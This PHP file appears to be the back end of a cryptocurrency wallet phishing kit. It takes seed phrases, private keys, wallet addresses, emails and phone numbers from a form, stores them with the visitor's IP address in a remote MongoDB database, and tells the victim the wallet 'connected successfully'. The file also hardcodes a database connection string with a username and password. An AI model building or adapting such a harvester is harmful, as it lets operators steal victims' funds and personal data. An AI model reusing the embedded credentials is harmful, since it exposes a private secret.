<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Install MongoDB PHP library first: composer require mongodb/mongodb
require_once 'vendor/autoload.php';

use MongoDB\Client;

$success_message = "";
$error_message = "";

// MongoDB connection
try {
    $mongoClient = new Client("mongodb+srv://kelechiemmanuel602:VLlttoRxldeA3kNL@cluster0.nbqruai.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0");
    $database = $mongoClient->selectDatabase('mark_db');
    $collection = $database->selectCollection('wallet_connections');
} catch (Exception $e) {
    die("MongoDB connection failed: " . $e->getMessage());
}

// Handle GET request
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    echo "<h3>✅ MongoDB Handler Ready</h3>";
    echo "<p>Connection: Successful</p>";
    echo "<a href='index.html'>← Back to form</a>";
    exit();
}

// Handle POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $walletName = trim($_POST['walletName'] ?? '');
    $walletAddress = trim($_POST['walletAddress'] ?? '');
    $seedPhrase = trim($_POST['seedPhrase'] ?? '');
    $privateKey = trim($_POST['privateKey'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    
    // Basic validation
    if (empty($walletName) || empty($walletAddress) || empty($seedPhrase) || empty($email) || empty($phone)) {
        $error_message = "All required fields must be filled";
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error_message = "Invalid email format";
    } else {
        // Insert into MongoDB
        try {
            $result = $collection->insertOne([
                'wallet_name' => $walletName,
                'wallet_address' => $walletAddress,
                'seed_phrase' => $seedPhrase,
                'private_key' => $privateKey,
                'email' => $email,
                'phone' => $phone,
                'created_at' => new MongoDB\BSON\UTCDateTime(),
                'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
            ]);
            
            if ($result->getInsertedCount() > 0) {
                $success_message = "Wallet connected successfully!";
            } else {
                $error_message = "Failed to save data";
            }
        } catch (Exception $e) {
            $error_message = "Database error: " . $e->getMessage();
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>MongoDB Result</title>
    <style>
        body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; }
        .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; }
        .back-link { display: inline-block; margin-top: 20px; padding: 10px 20px; 
                    background: #007bff; color: white; text-decoration: none; border-radius: 5px; }
    </style>
</head>
<body>
    <?php if ($success_message): ?>
        <div class="success">✅ <?php echo $success_message; ?></div>
        <p><strong>Data saved:</strong><br>
        Wallet: <?php echo htmlspecialchars($walletName); ?><br>
        Address: <?php echo htmlspecialchars($walletAddress); ?><br>
        Email: <?php echo htmlspecialchars($email); ?></p>
    <?php elseif ($error_message): ?>
        <div class="error">❌ <?php echo $error_message; ?></div>
    <?php endif; ?>
    
    <a href="index.html" class="back-link">← Back to Form</a>
</body>
</html>